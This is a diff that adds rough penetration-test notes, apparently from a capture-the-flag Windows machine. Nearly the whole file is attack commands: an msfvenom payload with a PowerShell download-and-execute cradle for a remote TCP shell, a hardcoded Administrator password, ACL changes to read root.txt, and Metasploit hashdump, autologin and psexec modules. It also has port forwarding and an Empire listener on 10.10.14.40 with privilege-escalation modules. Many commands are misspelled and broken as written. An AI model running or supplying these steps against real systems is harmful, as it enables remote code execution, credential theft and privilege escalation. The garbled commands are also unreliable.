@@ -1,0 +1,90 @@
+msfvenmon -a x86 --platform -p windows/exec CMD="powershell \"IEX(
+Net-Object Net.webclient
+        ).downloadString('http://ip/invoke-powershelltcp.ps1')\""
+
+
+$SecPass = ConverTo-SecureString 'Welcom1!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PsCredential('Administrator', $SecPass)
+
+$cred
+Ivoke-Command -FilePath c:\windows\system32\cmd.exe -Credential $cred -ScriptBlock {"whoami"}
+
+
+start-process  -FilePath "powershell" -argumentlist "IEX(DOWNLOAD)"  -Credential $cred
+
+Get-ACL administrator | Fl *
+Get-ACL root.txt | Fl *
+
+cacls /t /e /P alfir:F
+cacls root.txt /t /r alfred
+
+exploit/windows/misc/achat_bof -- not work
+
+search windows/gather
+smart_hashdump
+windows_autologin
+
+
+session -i 1 
+load powershell
+powershell_shell
+IEX(PowerUp.ps1)->Invoke-AllChecks
+---
+portfwd add -l 445 -p 445 -r 127.0.0.1
+
+netstat -anlp | grep 445
+
+search  psexec
+set SMBusers administrator
+set smbpass welcome1!
+set LHOST tun0
+set LPORT 9002
+----
+
+search run_as
+set CMD poweshell "IEX(invoke)"
+set user
+set password
+set domain
+----
+
+
+psexec.py 'Administrator:Weclcom1!@localhost' cmd
+
+github Empire
+
+----
+listerners
+ uselistener http
+   show options 
+     set HOST http://10.10.14.40:443
+     set BindIP 10.10.10.40
+     set port 443
+     execute
+     back
+  back
+listeners
+    uselistener http
+      launcher powershell
+
+agents
+  interact `agents`
+  info
+  search modules
+  usemodule privesc/powerup/allchecks
+  back
+info
+  search modules
+  usemodule management/runas
+  set Username 
+  set domain
+  set password
+  set cmd powershell
+  set argument
+
+
+
+
+
+
+
